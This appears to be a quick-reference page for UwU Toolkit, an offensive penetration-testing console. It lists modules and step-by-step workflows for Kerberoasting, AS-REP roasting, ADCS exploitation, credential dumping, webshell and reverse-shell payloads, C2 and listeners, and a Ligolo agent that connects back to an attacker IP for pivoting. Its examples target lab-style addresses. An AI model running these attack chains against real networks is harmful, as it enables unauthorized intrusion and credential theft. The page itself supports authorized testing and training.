---
layout: default
title: Quick Reference - UwU Toolkit
permalink: /uwu-toolkit/quick-reference/
---

# Quick Reference

Cheat sheet for common UwU Toolkit tasks.

---

## Installation

```bash
git clone https://github.com/p3ta00/uwu-toolkit.git
cd uwu-toolkit
./setup.sh
uwu
```

---

## Essential Setup

```bash
# Set target
setg RHOSTS 10.10.10.100

# Set credentials
setg DOMAIN corp.local
setg USER administrator
setg PASS Password123!

# Set attack machine
setg LHOST 10.10.14.50
setg LPORT 4444

# Set Exegol container
setg EXEGOL_CONTAINER exegol-htb

# Set Claude API key
setg ANTHROPIC_API_KEY sk-ant-api03-...
```

---

## Module Workflow

```bash
search <term>           # Find modules
use <path>              # Select module
options                 # View options
set <VAR> <value>       # Set option
run                     # Execute
back                    # Return to base
```

### Quick Examples

```bash
# Kerberoast
use ad/kerberoast
set RHOSTS 10.10.10.100
set DOMAIN corp.local
set USER admin
set PASS Password123
run

# SMB Share Enumeration
use auxiliary/smb/smb_shares
set RHOSTS 10.10.10.100
run

# Auto Enumeration
use enumeration/autoenum
set RHOSTS 10.10.10.100
run
```

---

## Commands Cheat Sheet

### Core
| Command | Description |
|---------|-------------|
| `help`, `?` | Show help |
| `exit`, `quit` | Exit console |
| `clear` | Clear screen |
| `banner` | Show banner |

### Modules
| Command | Description |
|---------|-------------|
| `use <path>` | Select module |
| `back` | Deselect module |
| `info` | Module details |
| `options` | Show options |
| `run`, `exploit` | Execute module |
| `check` | Check prerequisites |
| `search <term>` | Search modules |
| `reload` | Reload module |
| `show modules` | List all modules |

### Variables
| Command | Description |
|---------|-------------|
| `set <VAR> <val>` | Set session variable |
| `setg <VAR> <val>` | Set global variable |
| `unset <VAR>` | Unset session variable |
| `unsetg <VAR>` | Unset global variable |
| `setp <VAR> <val>` | Set persistent variable |
| `getp <VAR>` | Get persistent variable |
| `unsetp <VAR>` | Unset persistent variable |
| `showp` | Show persistent variables |
| `vars` | Show all variables |
| `globals` | Show global variables |
| `history [VAR]` | Show variable history |

### Target & Creds
| Command | Description |
|---------|-------------|
| `target` | Show current target info |
| `target del` | Clear target |
| `target vhost <host>` | Set virtual host |
| `target domain <domain>` | Set target domain |
| `creds` | Show stored credentials |
| `creds add` | Add credentials |
| `creds del` | Delete credentials |
| `creds use` | Use stored credentials |
| `creds import` | Import credentials from file |

### Setup & Config
| Command | Description |
|---------|-------------|
| `hashcrack_setup` | Configure hashcrack SSH backend |
| `uwu-clear` | Clear all state and temp files |
| `clocksync` | Sync clock with target DC |
| `hosts` | Manage /etc/hosts entries |
| `potatoes` | Download potato privilege escalation binaries |
| `nxc` | NetExec shortcut |
| `status` | Show environment status |
| `timeline` | Show attack timeline |

### Servers
| Command | Description |
|---------|-------------|
| `start gosh [port]` | HTTP server (default 8000) |
| `start php [port]` | PHP server (default 8080) |
| `start nc <port>` | Netcat listener |
| `stop <id>` | Stop service |
| `listeners` | List active services |

### Shell Management
| Command | Description |
|---------|-------------|
| `listen <port>` | Start shell listener |
| `shells`, `sessions` | List shells |
| `interact <id>` | Interact with shell |
| `kill <id>` | Kill shell |

### Claude AI
| Command | Description |
|---------|-------------|
| `claude`, `claude mode` | Interactive mode |
| `claude resume`, `fg` | Resume session |
| `claude ask "question"` | Quick question |
| `claude analyze <path>` | Analyze code |
| `claude debug <path>` | Debug code |
| `claude status` | Check availability |

### Sliver C2
| Command | Description |
|---------|-------------|
| `sliver start` | Start server |
| `sliver stop` | Stop server |
| `sliver connect [name]` | Connect client |
| `sliver resume`, `fg` | Resume client |
| `sliver status` | Check status |
| `sliver configs` | List configs |

### Penelope Shell Handler
| Command | Description |
|---------|-------------|
| `penelope [port]` | Start listener (default 4444) |
| `penelope resume`, `fg` | Resume session |
| `penelope status` | Check status |
| `penelope help` | Full help |

### Ligolo-ng Tunneling
| Command | Description |
|---------|-------------|
| `ligolo [port]` | Start proxy (default 11601) |
| `ligolo resume`, `fg` | Resume session |
| `ligolo agents` | List agents |
| `ligolo route add <net>` | Add route |
| `ligolo routes` | List routes |
| `ligolo status` | Check status |

### Shell Commands
| Command | Description |
|---------|-------------|
| `shell` | Interactive shell |
| `!<cmd>` | Execute shell command |
| `export` | Export variables |

---

## Common Module Paths

### Active Directory (`ad/`)
```
ad/kerberoast              # Kerberoast attack
ad/asreproast              # AS-REP roasting
ad/bloodhound_collect      # BloodHound data collection
ad/certipy_find            # AD CS enumeration
ad/certipy_exploit         # AD CS exploitation
ad/adcs_auto               # Automated ADCS scan + exploit
ad/netexec                 # NetExec wrapper
ad/ad_enum                 # AD enumeration
ad/ad_enumerate_all        # Full AD enumeration
ad/kerb_userenum           # Kerberos user enumeration
ad/password_spray          # Password spraying
ad/delegation_exploit      # Delegation attacks
ad/evil_winrm              # Evil-WinRM sessions
ad/targeted_kerberoast     # Targeted kerberoast
ad/rbcd_auto               # Automated RBCD attack
ad/bloodyad_validate       # BloodyAD validation
```

### SMB (`auxiliary/smb/`)
```
auxiliary/smb/smb_shares   # SMB share enumeration
auxiliary/smb/smb_read     # Read files from shares
auxiliary/smb/enum4linux   # enum4linux-ng wrapper
auxiliary/smb/ntlm_coerce  # NTLM coercion attacks
```

### Cracking (`auxiliary/cracking/`)
```
auxiliary/cracking/hashcrack  # Hash cracking (local/SSH)
```

### Enumeration (`enumeration/`)
```
enumeration/autoenum       # Full auto enumeration
enumeration/portscan_fast  # Fast TCP port scan
enumeration/dns_enum       # DNS enumeration
enumeration/web_fuzz       # Web directory fuzzing
enumeration/ftp_enum       # FTP enumeration
enumeration/nfs_enum       # NFS share enumeration
enumeration/vhost_scan     # Virtual host scanning
enumeration/dirsearch_scan # Dirsearch wrapper
```

### Post-Exploitation (`post/`)
```
post/linux/linpeas_enum              # LinPEAS
post/linux/pspy_monitor              # Process monitoring
post/linux/linux_recon               # Linux recon
post/linux/privesc_suggest           # Privilege escalation suggestions
post/windows/gather/lnk_parser      # LNK file parsing
post/windows/gather/installed_apps   # Installed applications
post/windows/gather/mremoteng_creds  # mRemoteNG credential extraction
post/windows/escalate/gpo_abuse      # GPO abuse
post/windows/sebackup_dump           # SeBackupPrivilege NTDS dump
post/windows/seimpersonate           # SeImpersonatePrivilege abuse
post/pivot/ligolo_pivot              # Ligolo-ng pivoting
```

### Payloads (`payloads/`)
```
payloads/reverse_shells    # Shell generator
payloads/donut             # Donut shellcode generator
payloads/aspx_shell        # ASPX webshell generator
```

---

## Variable History

```bash
# Interactive variable selection
set RHOSTS              # Shows history, pick from list

# View all history
history

# View specific variable history
history RHOSTS
```

---

## Resource Files

Create `.rc` files for automation:

```bash
# recon.rc
setg RHOSTS 10.10.10.100
use enumeration/autoenum
run
back
use auxiliary/smb/smb_shares
run
```

Execute:
```bash
python3 uwu -r recon.rc
```

---

## Command Line Options

```bash
python3 uwu                    # Interactive mode
python3 uwu -q                 # Quiet (no banner)
python3 uwu -r script.rc       # Execute resource file
python3 uwu -x "cmd1; cmd2"    # Execute commands
python3 uwu -h                 # Help
```

---

## Common Workflows

### Initial Enumeration

```bash
setg RHOSTS 10.10.10.100
use enumeration/autoenum
run
```

### AD Attack Chain

```bash
# 1. Enumerate users
use ad/kerb_userenum
set RHOSTS 10.10.10.100
set DOMAIN corp.local
run

# 2. AS-REP Roast
use ad/asreproast
set USER userlist.txt
run

# 3. Kerberoast
use ad/kerberoast
set USER admin
set PASS Password123
run

# 4. Crack hashes
use auxiliary/cracking/hashcrack
set HASHFILE kerberoast_hashes.txt
set HASHTYPE 13100
run
```

### ADCS Attack

```bash
# 1. Find vulnerable templates
use ad/certipy_find
set RHOSTS 10.10.10.100
set DOMAIN corp.local
set USER lowpriv
set PASS Password123
run

# 2. Exploit vulnerable template
use ad/certipy_exploit
run
```

### Post-Exploitation (Linux)

```bash
# Upload and run LinPEAS
use post/linux/linpeas_enum
set SESSION 1
run

# Monitor processes
use post/linux/pspy_monitor
set DURATION 120
run
```

### Start Services

```bash
# HTTP file server
start gosh 8000

# Listen for reverse shell
listen 4444
```

### Penelope Shell Handling

```bash
# Start Penelope listener
penelope 4444

# Receive shell, then Ctrl+D to background
# Listener stays active!

# Check shells from UwU
shells

# Resume Penelope
penelope resume
```

### Ligolo-ng Pivoting

```bash
# Start Ligolo proxy
ligolo

# On target: ./agent -connect YOUR_IP:11601 -ignore-cert
# In Ligolo: session, then start

# Ctrl+D to background, add routes from UwU
ligolo route add 10.10.10.0/24

# Now access internal network directly
!nmap -sV 10.10.10.50

# Resume Ligolo when needed
ligolo resume
```

---

## Tips

1. **Use `setg` for recurring values** - Domain, target, credentials
2. **Tab complete everything** - Faster than typing
3. **Check history** - `set VAR` without value shows history
4. **Use resource files** - Automate repetitive tasks
5. **Background sessions** - `Ctrl+D` to keep state
6. **Exegol fallback** - Tools run in container if not local
7. **Use `creds`** - Store and reuse credentials across modules
8. **Use `clocksync`** - Sync clock before Kerberos attacks

---

## Troubleshooting

### Module not found
```bash
reload          # Reload modules
show modules    # List all modules
```

### Exegol not detected
```bash
docker ps | grep exegol
setg EXEGOL_CONTAINER exegol-htb
```

### Tool not found
```bash
# Let Exegol handle it
setg EXEGOL_CONTAINER exegol-htb
```

### Permission denied
```bash
sudo uwu        # For raw sockets, etc.
```

### Kerberos clock skew
```bash
clocksync        # Sync with target DC
```

---

## Output Colors

| Color | Meaning |
|-------|---------|
| `[*]` Blue | Status/Info |
| `[+]` Green | Success |
| `[-]` Red | Error |
| `[!]` Orange | Warning |

---

## Keyboard Shortcuts

| Shortcut | Action |
|----------|--------|
| `Tab` | Autocomplete |
| `Ctrl+C` | Cancel current |
| `Ctrl+D` | Background/Exit |
| `Up/Down` | Command history |
| `Ctrl+R` | Search history |

---

[Back to Wiki Index](/uwu-toolkit/)
